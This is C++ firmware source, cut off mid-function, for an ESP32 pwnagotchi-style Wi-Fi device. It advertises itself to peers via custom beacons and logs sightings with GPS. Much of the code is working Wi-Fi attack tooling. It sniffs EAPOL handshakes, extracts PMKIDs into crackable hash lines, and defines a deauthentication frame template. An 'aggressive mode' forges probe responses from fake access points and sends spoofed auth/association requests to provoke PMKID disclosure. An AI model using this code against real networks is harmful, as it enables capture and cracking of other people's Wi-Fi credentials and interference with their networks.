#include <Preferences.h>
#include <freertos/FreeRTOS.h>
#include <memory>
#include "pwn.h"
#include "identity.h"
#include "config.h"
#include "GPSAnalyse.h"

GPSAnalyse GPS;
float Lat;
float Lon;
String Utc;
bool hasGPS = false;

static const char* NVS_NS = "pwn-stats";

const int away_threshold = 120000;

unsigned long fullPacketStartTime = 0;
const unsigned long PACKET_TIMEOUT_MS = 5000; // 5 seconds

portMUX_TYPE gRadioMux = portMUX_INITIALIZER_UNLOCKED;

static QueueHandle_t pktQueue = NULL;
static QueueHandle_t frQueue = NULL;

static const char* ADJ[] PROGMEM = {
  "brisk","calm","cheeky","clever","daring","eager","fuzzy","gentle","merry","nimble",
  "peppy","quirky","sly","spry","steady","swift","tidy","witty","zesty","zen"
};
static const char* ANM[] PROGMEM = {
  "otter","badger","fox","lynx","marten","panda","yak","koala","civet","ibis",
  "gecko","lemur","heron","tahr","fossa","saola","quokka","magpie","oriole","bongo"
};

constexpr uint8_t kDeauthFrameTemplate[] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff,
                                            0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                            0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};


std::set<String> known_macs;

Environment env;

uint64_t pwngrid_friends_tot = 0;
uint64_t pwngrid_friends_run = 0;

pwngrid_peer pwngrid_peers[255];
String pwngrid_last_friend_name = "";

uint8_t pwngrid_pwned_tot;
uint8_t pwngrid_pwned_run;

String fullPacket = "";

static String identityHex;              // storage stabile

DeviceConfig *config = getConfig();

std::set<BeaconEntry> gRegisteredBeacons;

extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, const void *buffer, int len);

void loadStats() {
  pwngrid_friends_tot = getFriendsTot();
  pwngrid_pwned_tot  = getPwnedTot();
}

void saveStats() {
  setStats(pwngrid_friends_tot, pwngrid_pwned_tot);
}

// helper: format MAC -> string
void MAC2str(const uint8_t mac[6], char *out /*18 bytes*/) {
  sprintf(out, "%02x:%02x:%02x:%02x:%02x:%02x",
          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// Fix esp_wifi_get_channel usage:
int wifi_get_channel() {
    uint8_t primary;
    wifi_second_chan_t second;
    esp_wifi_get_channel(&primary, &second);
    return primary;
}

void wifi_set_channel(int ch) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void dbFriendTask(void *pv) {
  pwngrid_peer item;
  for (;;) {
    if (xQueueReceive(frQueue, &item, portMAX_DELAY) == pdTRUE) {
      if (!mergeFriend(item, pwngrid_friends_tot)) {
        Serial.println("Merge failed for friend");
      }
    }
  }
}

void dbPacketTask(void *pv) {
  packet_item_t item;
  for (;;) {
    if (xQueueReceive(pktQueue, &item, portMAX_DELAY) == pdTRUE) {
      if (!addPacket(item)) {
        Serial.println("Insert failed for packet");
      } else {
        Serial.println("Packet saved to DB");
      }
    }
  }
}

// To be called when starting
void initDBWorkers() {
  frQueue = xQueueCreate(32, sizeof(pwngrid_peer));  
  xTaskCreatePinnedToCore(dbFriendTask, "dbFriendTask", 4096, NULL, 1, NULL, 1);

  pktQueue = xQueueCreate(32, sizeof(packet_item_t));  
  xTaskCreatePinnedToCore(dbPacketTask, "dbPacketTask", 4096, NULL, 1, NULL, 1);
}

// Call from promiscuous callback: ENQUEUE only
void enqueue_packet_from_sniffer(const uint8_t *pkt, size_t len, const uint8_t mac_bssid[6],
                                 const char *type, uint8_t channel) {
  if (!pktQueue) {
    Serial.println("enqueue_packet_from_sniffer error: pktQueue is invalid");
    return;
  }
  packet_item_t it;
  if (len > MAX_PKT_SAVE) len = MAX_PKT_SAVE;
  memcpy(it.data, pkt, len);
  it.len = len;
  it.channel = channel;
  MAC2str(mac_bssid, it.bssid);
  strncpy(it.type, type, sizeof(it.type) - 1);
  it.type[sizeof(it.type) - 1] = 0;
  it.ts_ms = (int64_t)(esp_timer_get_time() / 1000);  // ms
  BaseType_t ok = xQueueSend(pktQueue, &it, 0);       // no wait
  if (ok != pdTRUE) {
    Serial.println("Failed enqueuing packet");
    return;
  }
  Serial.println("Packet added to queue");
}

void enqueue_friend_from_sniffer(pwngrid_peer &a_friend) {
  if (!frQueue) {
    Serial.println("enqueue_friend_from_sniffer error: frQueue is invalid");
    return;
  }

  BaseType_t ok = xQueueSend(frQueue, &a_friend, 0);       // no wait
  if (ok != pdTRUE) {
    Serial.println("Failed enqueuing friend");
    return;
  }
}

uint8_t getPwngridTotalPeers() {
  return pwngrid_friends_tot;
}

uint8_t getPwngridRunTotalPeers() {
  return pwngrid_friends_run;
}

String getPwngridLastFriendName() {
  return pwngrid_last_friend_name;
}

pwngrid_peer *getPwngridPeers() {
  return pwngrid_peers;
}

uint8_t getPwngridTotalPwned() {
  return pwngrid_pwned_tot;
}

uint8_t getPwngridRunPwned() {
  return pwngrid_pwned_run;
}

// Had to remove Radiotap headers, since its automatically added
// Also had to remove the last 4 bytes (frame check sequence)
const uint8_t pwngrid_beacon_raw[] = {
  0x80, 0x00,                                      // FC
  0x00, 0x00,                                      // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,              // DA (broadcast)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,              // SA
  0xa1, 0x00, 0x64, 0xe6, 0x0b, 0x8b,              // BSSID
  0x40, 0x43,                                      // Sequence number/fragment number/seq-ctl
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
  0x64, 0x00,                                      // Beacon interval
  0x11, 0x04,                                      // Capability info
                                                   // 0xde (AC = 222) + 1 byte payload len + payload (AC Header)
                                                   // For each 255 bytes of the payload, a new AC header should be set
};

const int raw_beacon_len = sizeof(pwngrid_beacon_raw);

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len,
                            bool en_sys_seq);

esp_err_t pwngridAdvertise(uint8_t channel, String face) {
  //Serial.println("pwngridAdvertise...");
  DynamicJsonDocument pal_json(2048);
  String pal_json_str = "";

  auto id = ensurePwnIdentity(true);
  pal_json["pal"] = true;  // Also detect other Gotchis
  pal_json["name"] = getDeviceName();
  pal_json["face"] = face;
  pal_json["epoch"] = 1;
  pal_json["grid_version"] = GRID_VERSION;
  pal_json["identity"] = getFingerprintHex();
   // "32e9f315e92d974342c93d0fd952a914bfb4e6838953536ea6f63d54db6b9610"; Stock
   //  03af685e0e4ab18dd3c30163a5b0a7f2427bf77dc4298b2c672e8f48cfde75abc7 Generated Gotchi v1 - Bad
   //  a32c32d84158865c188091a720c20fa366f836a1d272cc85a9c51cca0cca9cf0 Generated Gotchi v2 - Good
  pal_json["pwnd_run"] = pwngrid_pwned_run;
  pal_json["pwnd_tot"] = pwngrid_pwned_tot;
  pal_json["session_id"] =  getSessionId();
  pal_json["timestamp"] = 0;
  pal_json["uptime"] = millis() / 1000;
  pal_json["version"] = PWNGRID_VERSION;
  pal_json["policy"]["advertise"] = true;
  pal_json["policy"]["bond_encounters_factor"] = 20000;
  pal_json["policy"]["bored_num_epoch"] = 0;
  pal_json["policy"]["sad_num_epoch"] = 0;
  pal_json["policy"]["excited_num_epoch"] = 9999;

  serializeJson(pal_json, pal_json_str);
  uint16_t pal_json_len = measureJson(pal_json);
  uint8_t header_len = 2 + ((uint8_t)(pal_json_len / 255) * 2);
  uint8_t pwngrid_beacon_frame[raw_beacon_len + pal_json_len + header_len];
  memcpy(pwngrid_beacon_frame, pwngrid_beacon_raw, raw_beacon_len);

  // Iterate through json string and copy it to beacon frame
  int frame_byte = raw_beacon_len;
  for (int i = 0; i < pal_json_len; i++) {
    // Write AC and len tags before every 255 bytes
    if (i == 0 || i % 255 == 0) {
      pwngrid_beacon_frame[frame_byte++] = 0xde;  // AC = 222
      uint8_t payload_len = 255;
      if (pal_json_len - i < 255) {
        payload_len = pal_json_len - i;
      }

      pwngrid_beacon_frame[frame_byte++] = payload_len;
    }

    // Append json byte to frame
    // If current byte is not ascii, add ? instead
    uint8_t next_byte = (uint8_t)'?';
    if (isAscii(pal_json_str[i])) {
      next_byte = (uint8_t)pal_json_str[i];
    }

    pwngrid_beacon_frame[frame_byte++] = next_byte;
  }

  // Channel switch not working?
  // vTaskDelay(500 / portTICK_PERIOD_MS);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(102);
  // https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/network/esp_wifi.html#_CPPv417esp_wifi_80211_tx16wifi_interface_tPKvib
  // vTaskDelay(103 / portTICK_PERIOD_MS);
  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_AP, pwngrid_beacon_frame,
                                       sizeof(pwngrid_beacon_frame), false);

  //Serial.println("Sent Advertise Beacon");
  return result;
}

void pwngridAddPeer(DynamicJsonDocument &json, signed int rssi, int channel) {
  String identity = json["identity"].as<String>();

  for (uint8_t i = 0; i < pwngrid_friends_run; i++) {
    // Check if peer identity is already in peers array
    if (pwngrid_peers[i].identity == identity) {
      pwngrid_peers[i].last_ping = millis();
      pwngrid_peers[i].gone = false;
      pwngrid_peers[i].rssi = rssi;
      //Serial.println("Peer already added");
      return;
    }
  }


  pwngrid_peers[pwngrid_friends_run].rssi = rssi;
  pwngrid_peers[pwngrid_friends_run].last_ping = millis();
  pwngrid_peers[pwngrid_friends_run].gone = false;
  pwngrid_peers[pwngrid_friends_run].name = json["name"].as<String>();
  pwngrid_peers[pwngrid_friends_run].face = json["face"].as<String>();
  pwngrid_peers[pwngrid_friends_run].epoch = json["epoch"].as<int>();
  pwngrid_peers[pwngrid_friends_run].grid_version = json["grid_version"].as<String>();
  pwngrid_peers[pwngrid_friends_run].identity = identity;
  pwngrid_peers[pwngrid_friends_run].pwnd_run = json["pwnd_run"].as<int>();
  pwngrid_peers[pwngrid_friends_run].pwnd_tot = json["pwnd_tot"].as<int>();
  pwngrid_peers[pwngrid_friends_run].session_id = json["session_id"].as<String>();
  pwngrid_peers[pwngrid_friends_run].timestamp = json["timestamp"].as<int>();
  pwngrid_peers[pwngrid_friends_run].uptime = json["uptime"].as<int>();
  pwngrid_peers[pwngrid_friends_run].version = json["version"].as<String>();
  pwngrid_peers[pwngrid_friends_run].channel = channel;

  pwngrid_last_friend_name = String(pwngrid_peers[pwngrid_friends_run].name);
  Serial.println("pwngrid_last_friend_name: " + pwngrid_last_friend_name);

  enqueue_friend_from_sniffer(pwngrid_peers[pwngrid_friends_run]);
  pwngrid_friends_run++;
  saveStats();

  if (hasGPS) {
    GPS.upDate();
    Lat = GPS.s_GNRMC.Latitude;
    Lon = GPS.s_GNRMC.Longitude;
    Utc = GPS.s_GNRMC.Utc;
    Serial.printf("Just spotted %s at:", json["name"].as<String>());
    Serial.printf("Latitude= %.5f \r\n",Lat);
    Serial.printf("Longitude= %.5f \r\n",Lon);
    Serial.printf("DATA= %s \r\n",Utc);
  }
}

void checkPwngridGoneFriends() {
  for (uint8_t i = 0; i < pwngrid_friends_tot; i++) {
    // Check if peer is away for more then
    int away_secs = pwngrid_peers[i].last_ping - millis();
    if (away_secs > away_threshold) {
      pwngrid_peers[i].gone = true;
      return;
    }
  }
}

signed int getPwngridClosestRssi() {
  signed int closest = -1000;

  for (uint8_t i = 0; i < pwngrid_friends_tot; i++) {
    // Check if peer is away for more then
    if (pwngrid_peers[i].gone == false && pwngrid_peers[i].rssi > closest) {
      closest = pwngrid_peers[i].rssi;
    }
  }

  return closest;
}

// Detect pwnagotchi adapted from Marauder
// https://github.com/justcallmekoko/ESP32Marauder/wiki/detect-pwnagotchi
// https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.cpp#L2255
typedef struct {
  int16_t fctl;
  int16_t duration;
  uint8_t da;
  uint8_t sa;
  uint8_t bssid;
  int16_t seqctl;
  unsigned char payload[];
} __attribute__((packed)) WifiMgmtHdr;

typedef struct {
  uint8_t payload[0];
  WifiMgmtHdr hdr;
} wifi_ieee80211_packet_t;

void getMAC(char *addr, uint8_t *data, uint16_t offset) {
  sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset + 0],
          data[offset + 1], data[offset + 2], data[offset + 3],
          data[offset + 4], data[offset + 5]);
}

void printHex(const uint8_t *b, size_t len) {
  for (size_t i = 0; i < len; ++i) {
    if (b[i] < 0x10) Serial.print('0');
    Serial.print(b[i], HEX);
    if (i + 1 < len) Serial.print(':');
  }
  Serial.println();
}

bool isEapol(const uint8_t *buf, int len) {
    // Must be data frame
    uint8_t type = (buf[0] >> 2) & 0x03;
    if (type != 2) return false; // data
    if (len < 40) return false;

    // LLC/SNAP header for EAPOL
    //  AA AA 03 00 00 00 88 8E
    const uint8_t snap_hdr[] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};

    for (int i = 0; i < 8; i++) {
        if (buf[24 + i] != snap_hdr[i]) return false;
    }

    return true;
}

String formatPMKID(const uint8_t pmkid[16],
                   const uint8_t ap_mac[6],
                   const uint8_t client_mac[6],
                   const String &ssid)
{
    char buf[256];

    char pmkid_hex[33];
    for (int i = 0; i < 16; i++)
        sprintf(&pmkid_hex[i*2], "%02x", pmkid[i]);

    char ap_hex[13];
    sprintf(ap_hex, "%02x%02x%02x%02x%02x%02x",
            ap_mac[0],ap_mac[1],ap_mac[2],ap_mac[3],ap_mac[4],ap_mac[5]);

    char cli_hex[13];
    sprintf(cli_hex, "%02x%02x%02x%02x%02x%02x",
            client_mac[0],client_mac[1],client_mac[2],client_mac[3],client_mac[4],client_mac[5]);

    snprintf(buf, sizeof(buf), "%s*%s*%s*%s",
             pmkid_hex, ap_hex, cli_hex, ssid.c_str());

    return String(buf);
}

bool extractPMKID(const uint8_t *frame, int len,
                  uint8_t pmkid_out[16],
                  uint8_t ap_mac_out[6],
                  uint8_t client_mac_out[6])
{
    if (!isEapol(frame, len)) return false;

    // addresses
    memcpy(ap_mac_out,     frame + 16, 6); // addr3 = AP
    memcpy(client_mac_out, frame + 10, 6); // addr2 = client

    // Locate EAPOL-Key frame
    int pos = 24 + 8; // after SNAP header = data payload
    if (pos + 95 >= len) return false;

    uint8_t key_descriptor = frame[pos + 1];
    if (key_descriptor != 2) {
        // Not WPA2 key descriptor
        return false;
    }

    // Key Data Length (2 bytes)
    int key_data_len = (frame[pos + 97] << 8) | frame[pos + 98];
    int key_data_start = pos + 99;

    if (key_data_start + key_data_len > len) return false;

    // Scan IEs inside Key Data
    int ie_pos = key_data_start;
    while (ie_pos + 2 < len && ie_pos < key_data_start + key_data_len) {
        uint8_t id = frame[ie_pos];
        uint8_t ie_len = frame[ie_pos + 1];

        if (id == 0x30) { // RSN IE
            // Look for PMKID Count inside RSN
            int rsn_end = ie_pos + 2 + ie_len;
            int p = ie_pos + 2;

            while (p + 18 <= rsn_end) {
                uint8_t pmkid_count = frame[p];
                uint8_t pmkid_count2 = frame[p+1];

                if (pmkid_count == 0x00 && pmkid_count2 == 0x01) {
                    memcpy(pmkid_out, frame + p + 2, 16);
                    return true;
                }
                p++;
            }
        }

        ie_pos += 2 + ie_len;
    }

    return false;
}

void generateFakeApMac(uint8_t mac_out[6]) {
    mac_out[0] = 0x02;  // locally administered, unicast
    mac_out[1] = esp_random() & 0xFF;
    mac_out[2] = esp_random() & 0xFF;
    mac_out[3] = esp_random() & 0xFF;
    mac_out[4] = esp_random() & 0xFF;
    mac_out[5] = esp_random() & 0xFF;
}

String macToString(const uint8_t mac[6]) {
    char buf[18];
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

String extractSSIDfromProbe(const uint8_t *frame, int len) {
    // mgmt header = 24 bytes
    int pos = 24;

    while (pos + 2 < len) {
        uint8_t tag = frame[pos];
        uint8_t tag_len = frame[pos+1];

        if (tag == 0) { // SSID
            if (tag_len == 0) return "";
            return String((char*)&frame[pos+2], tag_len);
        }

        pos += 2 + tag_len;
    }

    return "";
}

void generateFakeClientMac(uint8_t mac_out[6]) {
    mac_out[0] = 0x0A; // locally administered
    mac_out[1] = esp_random() & 0xFF;
    mac_out[2] = esp_random() & 0xFF;
    mac_out[3] = esp_random() & 0xFF;
    mac_out[4] = esp_random() & 0xFF;
    mac_out[5] = esp_random() & 0xFF;
}

String extractClientfromProbe(const uint8_t *frame) {
    char buf[18];
    sprintf(buf,
            "%02X:%02X:%02X:%02X:%02X:%02X",
            frame[10], frame[11], frame[12],
            frame[13], frame[14], frame[15]);
    return String(buf);
}

String extractSSIDfromAP(const uint8_t *frame, int len) {
    int pos = 36; // beacon header è 36 bytes
    while (pos + 2 < len) {
        uint8_t tag = frame[pos];
        uint8_t tag_len = frame[pos+1];
        if (tag == 0) { // SSID
            return String((char*)&frame[pos+2], tag_len);
        }
        pos += 2 + tag_len;
    }
    return "";
}

void getApMac(const uint8_t *frame, uint8_t mac_out[6]) {
    memcpy(mac_out, frame + 16, 6); // addr3
}

bool isBeacon(const uint8_t *frame) {
    uint8_t fc = frame[0];
    uint8_t type = (fc >> 2) & 0x03;
    uint8_t subtype = (fc >> 4) & 0x0F;
    return (type == 0 && subtype == 8);
}

bool isProbeResp(const uint8_t *frame) {
    uint8_t fc = frame[0];
    uint8_t type = (fc >> 2) & 0x03;
    uint8_t subtype = (fc >> 4) & 0x0F;
    return (type == 0 && subtype == 5);
}

bool isProbeRequest(const uint8_t *f) {
    uint8_t fc = f[0];
    uint8_t type = (fc >> 2) & 0x03;     // bits 2-3
    uint8_t subtype = (fc >> 4) & 0x0F;  // bits 4-7
    return (type == 0 && subtype == 4);
}

void sendAuthReq(const uint8_t ap_mac[6], const uint8_t client_mac[6]) {
    uint8_t frame[30];
    int pos = 0;

    frame[pos++] = 0xB0; // Auth frame
    frame[pos++] = 0x00;

    frame[pos++] = 0; frame[pos++] = 0;

    memcpy(frame+pos, ap_mac, 6); pos+=6;     // dest = AP
    memcpy(frame+pos, client_mac, 6); pos+=6; // src = our fake client
    memcpy(frame+pos, ap_mac, 6); pos+=6;     // BSSID

    frame[pos++] = 0; frame[pos++] = 0;       // seq/frag

    frame[pos++] = 0x00; frame[pos++] = 0x00; // auth algo = open
    frame[pos++] = 0x01; frame[pos++] = 0x00; // seq num
    frame[pos++] = 0x00; frame[pos++] = 0x00; // status

    esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);
}

void sendAssocReq(const uint8_t ap_mac[6], const uint8_t client_mac[6], const char *ssid) {
    uint8_t frame[256];
    int pos = 0;

    frame[pos++] = 0x00; // assoc request
    frame[pos++] = 0x00;

    frame[pos++] = 0; frame[pos++] = 0;

    memcpy(frame+pos, ap_mac, 6); pos+=6;
    memcpy(frame+pos, client_mac, 6); pos+=6;
    memcpy(frame+pos, ap_mac, 6); pos+=6;

    frame[pos++] = 0; frame[pos++] = 0; // frag/seq

    frame[pos++] = 0x31; frame[pos++] = 0x04; // capabilities

    frame[pos++] = 0x64; frame[pos++] = 0; // listen interval

    // SSID IE
    int ssid_len = strlen(ssid);
    frame[pos++] = 0x00;
    frame[pos++] = ssid_len;
    memcpy(frame+pos, ssid, ssid_len);
    pos += ssid_len;

    // Supported rates
    uint8_t rates[] = {0x82,0x84,0x8b,0x96};
    frame[pos++] = 0x01;
    frame[pos++] = sizeof(rates);
    memcpy(frame+pos, rates, sizeof(rates));
    pos += sizeof(rates);

    esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);
}

void sendProbeResp(wifi_interface_t ifx,
                   const uint8_t client_mac[6],
                   const uint8_t ap_mac[6],
                   const char *ssid) 
{
    uint8_t frame[256];
    int pos = 0;

    // --- FRAME CONTROL ---
    frame[pos++] = 0x50; // Type=0 mgmt, Subtype=5 (probe response)
    frame[pos++] = 0x00;

    // --- DURATION ---
    frame[pos++] = 0x00; 
    frame[pos++] = 0x00;

    // --- ADDRESSES ---
    // dest → client
    memcpy(&frame[pos], client_mac, 6); pos += 6;
    // source → fake AP
    memcpy(&frame[pos], ap_mac, 6); pos += 6;
    // BSSID → fake AP
    memcpy(&frame[pos], ap_mac, 6); pos += 6;

    // --- SEQ/FRAG ---
    frame[pos++] = 0x00;
    frame[pos++] = 0x00;

    // --- TIMESTAMP (dummy 8 bytes) ---
    for (int i = 0; i < 8; i++) frame[pos++] = 0x00;

    // --- BEACON INTERVAL ---
    frame[pos++] = 0x64; // 100 TU
    frame[pos++] = 0x00;

    // --- CAPABILITIES ---
    frame[pos++] = 0x21; // ESS + Short Preamble
    frame[pos++] = 0x04;

    // --- SSID element ---
    int ssid_len = strlen(ssid);
    frame[pos++] = 0x00;      // tag SSID
    frame[pos++] = ssid_len;  // length
    memcpy(&frame[pos], ssid, ssid_len);
    pos += ssid_len;

    // --- Supported Rates ---
    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96};
    frame[pos++] = 0x01;
    frame[pos++] = sizeof(rates);
    memcpy(&frame[pos], rates, sizeof(rates));
    pos += sizeof(rates);

    // --- DS Params (channel) ---
    frame[pos++] = 0x03; // DS tag
    frame[pos++] = 1;
    frame[pos++] = 6; // channel 6 default

    // --- RSN IE (WPA2-PSK minimal) ---
    const uint8_t rsn_ie[] = {
        0x30, 0x14,
        0x01, 0x00,
        0x00, 0x0f, 0xac, 0x02,
        0x02, 0x00,
        0x00, 0x0f, 0xac, 0x04,
        0x00, 0x0f, 0xac, 0x02,
        0x00, 0x00
    };
    memcpy(&frame[pos], rsn_ie, sizeof(rsn_ie));
    pos += sizeof(rsn_ie);

    // --- SEND ---
    esp_err_t r = esp_wifi_80211_tx(ifx, frame, pos, false);
    //Serial.printf("ProbeResp sent, len=%d, err=%d\n", pos, r);
}

void handlePacket(wifi_promiscuous_pkt_t *snifferPacket) {
  wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)snifferPacket;
  uint8_t *pkt = ppkt->payload;
  int pkt_len = ppkt->rx_ctrl.sig_len ? ppkt->rx_ctrl.sig_len : 300;  
  int rx_channel = ppkt->rx_ctrl.channel;

  const uint8_t *frame = ppkt->payload;
  const uint16_t frameCtrl = static_cast<uint16_t>(frame[0]) | (static_cast<uint16_t>(frame[1]) << 8);
  const uint8_t frameType = (frameCtrl & 0x0C) >> 2;
  const uint8_t frameSubtype = (frameCtrl & 0xF0) >> 4;

  char addr[] = "00:00:00:00:00:00";
  getMAC(addr, snifferPacket->payload, 10);

  uint8_t pmkid[16];
  uint8_t ap_mac[6];
  uint8_t client_mac[6];


  String mac = String(addr);
  if (known_macs.find(mac) == known_macs.end()) {
      known_macs.insert(mac);
      env.new_aps_found++;
      env.ap_count++;
  }

  if (frameType == 0x00 && frameSubtype == 0x08) {
        BeaconEntry entry;
        const uint8_t *sender = frame + 10;
        memcpy(entry.mac, sender, sizeof(entry.mac));
        entry.channel = wifi_get_channel();
        portENTER_CRITICAL(&gRadioMux);
        gRegisteredBeacons.insert(entry);
        portEXIT_CRITICAL(&gRadioMux);
  }

  bool isEapol = false;
  if (pkt_len > 34) {  // semplice bound check
    if ((pkt[30] == 0x88 && pkt[31] == 0x8e) || (pkt[32] == 0x88 && pkt[33] == 0x8e)) {
      isEapol = true;
    }
  }

  if (isEapol) {
    Serial.println("We have EAPOL");
    drawMood(pwnagotchi_moods[10], "I love EAPOLs!", false, getPwngridLastFriendName(), getPwngridClosestRssi());

    env.eapol_packets++;
    env.got_handshake = true;
    env.last_handshake_time = millis();
    
    pwngrid_pwned_run++;
    pwngrid_pwned_tot++;
    saveStats();
    if (pkt_len < 24) return;

    // frame control (little-endian)
    uint16_t fc = pkt[0] | (pkt[1] << 8);
    uint8_t fc_type = (fc >> 2) & 0x3;  // 0=mgmt,1=ctrl,2=data
    bool toDS = fc & 0x0100;
    bool fromDS = fc & 0x0200;

    uint8_t addr1[6], addr2[6], addr3[6], addr4[6];
    memcpy(addr1, pkt + 4, 6);
    memcpy(addr2, pkt + 10, 6);
    memcpy(addr3, pkt + 16, 6);
    if (pkt_len >= 30) memcpy(addr4, pkt + 24, 6);

    uint8_t bssid[6];
    if (fc_type == 0) {  // management
      memcpy(bssid, addr3, 6);
    } else if (fc_type == 2) {  // data
      if (!toDS && !fromDS) {
        memcpy(bssid, addr3, 6);
      } else if (!toDS && fromDS) {
        memcpy(bssid, addr2, 6);
      } else if (toDS && !fromDS) {
        memcpy(bssid, addr3, 6);
      } else {  // toDS && fromDS
        memcpy(bssid, addr4, 6);
      }
    } else {
      memcpy(bssid, addr3, 6);  // fallback
    }
    enqueue_packet_from_sniffer(pkt, pkt_len, bssid, "EAPOL", (uint8_t)rx_channel);
  }

  if (extractPMKID(frame, pkt_len, pmkid, ap_mac, client_mac)) {
      String ssid = extractSSIDfromAP(frame, pkt_len); // o tienilo da beacon
      String formatted = formatPMKID(pmkid, ap_mac, client_mac, ssid);
      Serial.print("[PMKID] ");
      Serial.println(formatted);
      env.got_pmkid = true;
      enqueue_packet_from_sniffer(pkt, 16, ap_mac, "PMKID", (uint8_t)rx_channel);
  }

  if (getEnv().action == AGGRESSIVE_MODE) {
    if (isProbeRequest(frame) && (esp_random() % 100) == 7) {
      String ssid = extractSSIDfromProbe(frame, ppkt->rx_ctrl.sig_len);
      if (ssid.length() == 0) {
          Serial.println("Empty SSID in Probe");
          return;
      }

      String clientMac = extractClientfromProbe(frame);
      Serial.printf("[Probe] SSID='%s' from %s\n",
                    ssid.c_str(),
                    clientMac.c_str());

      uint8_t fake_ap[6];
      generateFakeApMac(fake_ap);

      //Serial.print("[FakeAP] Using dynamic BSSID ");
      //Serial.println(macToString(fake_ap).c_str());

      const uint8_t* client_mac_raw = frame + 10; // addr2
      sendProbeResp(WIFI_IF_AP, client_mac_raw, fake_ap, ssid.c_str());

      //Serial.printf("[FakeAP] ProbeResp sent to %s\n", clientMac.c_str());
    }

    if ((isBeacon(frame) || isProbeResp(frame)) && (esp_random() % 100) == 7) {

      String ssid = extractSSIDfromAP(frame, pkt_len);
      if (ssid.length() == 0) return;

      uint8_t ap_mac[6];
      getApMac(frame, ap_mac);
    
      uint8_t fake_client[6];
      generateFakeClientMac(fake_client);

      Serial.printf("[PMKID-HUNT] AP=%s SSID='%s'\n",
                    macToString(ap_mac).c_str(), ssid.c_str());

      sendAuthReq(ap_mac, fake_client);
      vTaskDelay(10 / portTICK_PERIOD_MS);
      sendAssocReq(ap_mac, fake_client, ssid.c_str());
    }
  }
}

void pwnSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {

  //Serial.println("pwnSnifferCallback...");
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;

  String src = "";
  String essid = "";

  if (type == WIFI_PKT_MGMT) {
    // Remove frame check sequence bytes
    int len = snifferPacket->rx_ctrl.sig_len - 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt =
      (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    //Check if we do something about EAPOLs or PMKIDs
    if ( config->personality == AI )  {      
      handlePacket(snifferPacket);
    }

    if ((snifferPacket->payload[0] == 0x80)) {
      // Beacon frame
      // Get source MAC
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      src.concat(addr);

      if (src == "de:ad:be:ef:de:ad") {
        // compute payload length robustly
        int raw_len = snifferPacket->rx_ctrl.sig_len;
        // avoid negative or insane lengths
        int len = raw_len - 4;  // ✓ Match the logic at the top
        if (len < 0 || len > 4096) {
            Serial.println("Invalid packet length");
            return;
        }

        // pointer to payload start
        const uint8_t* p = (const uint8_t*)snifferPacket->payload;

        // 802.11 Beacon layout (simplified):
        // - MAC header: 24 bytes (but can be 30 with QoS/Addr4 etc). We use hdr->... earlier; continue safe scanning.
        // Heuristic: tagged parameters usually start after the fixed beacon fields (timestamp 8 + beacon interval 2 + capability 2),
        // so offset = header_len + 12
        int hdr_len = 24; // typical management header length
        // if RTS/addr4 or other flags present, hdr_len could differ; use value from snifferPacket if available
        // We'll try safe offset: 24 + 12 = 36
        int tagged_offset = 36;
        if (tagged_offset >= len) {
          // nothing to parse
          return;
        }

        // Scan IEs
        int i = tagged_offset;
        while (i + 2 <= len - 1) { // need at least id + length
          uint8_t ie_id = p[i];
          uint8_t ie_len = p[i + 1];

          // sanity check bounds
          if (i + 2 + ie_len > len) {
            // malformed IE, stop scanning
            Serial.printf("IE parse out of bounds: i=%d ie_id=%u ie_len=%u len=%d\n", i, ie_id, ie_len, len);
            break;
          }

          // Extract payload bytes exactly (no isAscii filter)
          String ie_data;
          ie_data.reserve(ie_len + 1);
          for (int k = 0; k < ie_len; ++k) {
            ie_data += (char)p[i + 2 + k];
          }

          String packet = "";
          
          packet.concat(ie_data);
          if (packet.indexOf('{') == 0) {
              //Serial.println("Start of Advertise packet: " + packet);
              fullPacket = packet;
              fullPacketStartTime = millis();

              // Check if it's also complete in one IE (small JSON)
              if (packet.length() > 0 && packet[packet.length() - 1] == '}') {
                  //Serial.println("Complete JSON in single IE!");
                  const size_t DOC_SIZE = 4096;
                  DynamicJsonDocument sniffed_json(DOC_SIZE);
                  DeserializationError result = deserializeJson(sniffed_json, fullPacket.c_str());
                  if (result == DeserializationError::Ok) {
                      sniffed_json["rssi"] = snifferPacket->rx_ctrl.rssi;
                      sniffed_json["channel"] = snifferPacket->rx_ctrl.channel;
                      pwngridAddPeer(sniffed_json, snifferPacket->rx_ctrl.rssi, snifferPacket->rx_ctrl.channel);
                  } else {
                      Serial.print("JSON parse error: ");
                      Serial.println(result.c_str());
                  }
                  fullPacket = "";
              }
          } else if (fullPacket.length() > 0) {
              if (millis() - fullPacketStartTime > PACKET_TIMEOUT_MS) {
